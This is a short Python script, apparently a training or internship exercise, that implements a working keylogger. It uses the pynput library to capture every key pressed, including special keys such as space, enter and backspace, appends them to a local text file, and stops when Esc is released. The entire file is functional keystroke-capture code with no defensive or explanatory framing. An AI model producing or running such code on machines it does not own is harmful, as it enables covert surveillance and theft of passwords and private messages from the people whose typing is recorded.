from pynput.keyboard import Key, Listener

log_file = "D:\\prodigy infotech\\keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        elif key == Key.backspace:
            with open(log_file, "a") as f:
                f.write("[BACKSPACE]")
        else:
            with open(log_file, "a") as f:
                f.write(f"[{key.name.upper()}]")

def on_release(key):
    if key == Key.esc:
        return False  

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
